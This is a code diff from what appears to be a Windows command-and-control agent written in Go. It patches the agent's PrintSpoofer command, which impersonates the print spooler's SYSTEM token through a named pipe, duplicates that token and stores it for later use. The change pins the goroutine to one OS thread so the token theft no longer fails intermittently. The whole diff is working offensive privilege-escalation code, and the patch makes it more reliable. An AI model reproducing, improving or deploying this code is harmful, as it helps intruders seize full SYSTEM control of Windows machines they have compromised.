@@ -6,6 +6,7 @@ package commands
 import (
 	"encoding/json"
 	"fmt"
+	"runtime"
 	"strings"
 	"time"
 	"unsafe"
@@ -229,9 +230,17 @@ func (c *PrintSpooferCommand) Execute(task structs.Task) structs.CommandResult {
 		}
 	}
 
+	// Lock goroutine to OS thread for the entire impersonation sequence.
+	// ImpersonateNamedPipeClient sets the token on the current OS thread,
+	// and Go's scheduler can migrate goroutines between threads at any point.
+	// Without LockOSThread, OpenThreadToken may run on a different thread
+	// and fail with ERROR_NO_TOKEN (1008).
+	runtime.LockOSThread()
+
 	// Spooler connected — impersonate the SYSTEM token
 	impRet, _, impErr := procImpersonateNamedPipeClient.Call(hPipe)
 	if impRet == 0 {
+		runtime.UnlockOSThread()
 		procDisconnectNamedPipe.Call(hPipe)
 		return structs.CommandResult{
 			Output:    fmt.Sprintf("ImpersonateNamedPipeClient failed: %v", impErr),
@@ -254,6 +263,7 @@ func (c *PrintSpooferCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 	if err != nil {
 		procRevertToSelf.Call()
+		runtime.UnlockOSThread()
 		procDisconnectNamedPipe.Call(hPipe)
 		return structs.CommandResult{
 			Output:    fmt.Sprintf("Spooler connected as %s but failed to capture token: %v", clientIdentity, err),
@@ -286,6 +296,7 @@ func (c *PrintSpooferCommand) Execute(task structs.Task) structs.CommandResult {
 
 	if err != nil {
 		procRevertToSelf.Call()
+		runtime.UnlockOSThread()
 		procDisconnectNamedPipe.Call(hPipe)
 		return structs.CommandResult{
 			Output:    fmt.Sprintf("Spooler connected as %s but DuplicateTokenEx failed: %v", clientIdentity, err),
@@ -298,8 +309,9 @@ func (c *PrintSpooferCommand) Execute(task structs.Task) structs.CommandResult {
 	procRevertToSelf.Call()
 	procDisconnectNamedPipe.Call(hPipe)
 
-	// Store in global identity system
+	// Store in global identity system (calls ImpersonateLoggedOnUser on this thread)
 	if setErr := SetIdentityToken(dupToken); setErr != nil {
+		runtime.UnlockOSThread()
 		windows.CloseHandle(windows.Handle(dupToken))
 		return structs.CommandResult{
 			Output:    fmt.Sprintf("Spooler connected as %s but SetIdentityToken failed: %v", clientIdentity, setErr),
@@ -307,6 +319,9 @@ func (c *PrintSpooferCommand) Execute(task structs.Task) structs.CommandResult {
 			Completed: true,
 		}
 	}
+
+	// Mark as thread-locked so PrepareExecution doesn't double-lock
+	osThreadLocked = true
 
 	var sb strings.Builder
 	sb.WriteString("=== PRINTSPOOFER SUCCESS ===\n\n")
